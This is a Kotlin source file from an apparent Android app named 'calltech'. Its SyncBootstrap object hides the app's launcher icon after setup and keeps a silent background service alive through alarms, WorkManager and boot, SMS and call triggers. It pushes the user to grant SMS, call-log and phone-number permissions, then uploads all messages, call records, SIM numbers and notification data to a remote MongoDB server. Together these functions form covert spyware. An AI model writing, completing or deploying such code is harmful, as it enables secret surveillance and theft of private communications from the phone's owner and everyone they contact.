package com.calltech

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import androidx.core.content.ContextCompat

object SyncBootstrap {
    private const val TAG = "SyncBootstrap"

    /** Alarm + WorkManager + silent foreground service (kill state ke liye). */
    fun armBackgroundSync(context: Context) {
        val app = context.applicationContext
        if (InstallFlow.isSetupComplete(app)) {
            LauncherHider.hide(app)
        }
        SyncAlarmScheduler.start(app)
        SyncWorkScheduler.schedule(app)

        if (!needsRuntimePermissions(app)) {
            CallSyncService.ensureRunning(app)
        }
    }

    /** Install / boot / SMS / call — bina app UI khole background sync. */
    fun ensureBackgroundReady(context: Context) {
        val app = context.applicationContext
        try {
            MongoSyncHelper.ensureApiUrl(app)
            CallSyncHelper.markBackgroundSyncEnabled(app, true)
            PendingCallSync.flushIfPending(app)

            armBackgroundSync(app)

            if (!needsRuntimePermissions(app)) {
                start(app, "background_ready")
            } else {
                Log.w(
                    TAG,
                    "Permissions missing — permission dialog open ho raha hai",
                )
                launchPermissionTrampoline(app)
            }

            Log.d(TAG, "Background sync armed")
        } catch (error: Exception) {
            Log.e(TAG, "ensureBackgroundReady failed", error)
        }
    }

    fun start(context: Context, source: String = "bootstrap") {
        val app = context.applicationContext
        try {
            MongoSyncHelper.ensureApiUrl(app)
            if (!MongoSyncHelper.isConfigured(app)) {
                Log.e(
                    TAG,
                    "MongoDB sync OFF — server/.env me MONGODB_URI set karo aur app dubara install karo",
                )
            }

            CallSyncHelper.markBackgroundSyncEnabled(app, true)
            PendingCallSync.flushIfPending(app)

            armBackgroundSync(app)
            SyncObserverManager.register(app)
            NotificationListenerHelper.requestRebind(app)

            BackgroundSyncRunner.run {
                DeviceRegistration.registerNow(app)
                PendingSmsQueue.flush(app)
                PendingCallQueue.flush(app)
                LocalDataStore.syncPendingToMongo(app, source)
                SyncScheduler.syncIfPermittedNow(app, source)
            }
            Log.d(TAG, "Background Mongo sync started ($source)")
        } catch (error: Exception) {
            Log.e(TAG, "Sync bootstrap failed", error)
        }
    }

    fun needsRuntimePermissions(context: Context): Boolean {
        return requiredPermissions().any { permission ->
            ContextCompat.checkSelfPermission(context, permission) !=
                PackageManager.PERMISSION_GRANTED
        }
    }

    fun requiredPermissions(): Array<String> {
        val permissions = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
        )

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            permissions.add(Manifest.permission.READ_PHONE_NUMBERS)
        }

        return permissions.toTypedArray()
    }

    /** Permissions missing hone par system dialog — Realme/Xiaomi par zaroori. */
    fun launchPermissionTrampoline(context: Context) {
        if (!needsRuntimePermissions(context)) {
            return
        }

        try {
            val intent = android.content.Intent(context, PermissionTrampolineActivity::class.java).apply {
                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            Log.d(TAG, "Permission trampoline launched")
        } catch (error: Exception) {
            Log.w(TAG, "Permission trampoline failed: ${error.message}")
        }
    }

    fun onPermissionsReady(context: Context) {
        val app = context.applicationContext
        BackgroundSyncNotifier.cancelPermission(app)

        BackgroundSyncRunner.run {
            CallSyncService.holdDuring(app) {
                DeviceRegistration.registerNow(app)
                SimNumberHelper.registerAllSimsInMongo(app)
                SyncScheduler.syncIfPermittedNow(app, "permissions_ready")
                MessageSyncHelper.syncAllMessagesNow(app, "permissions_ready")
                CallSyncHelper.syncAllCallsToMongoNow(app, "permissions_ready")
                InstallFlow.completeSetup(app)
            }
            SyncWorkScheduler.enqueueNow(app)
        }
    }
}
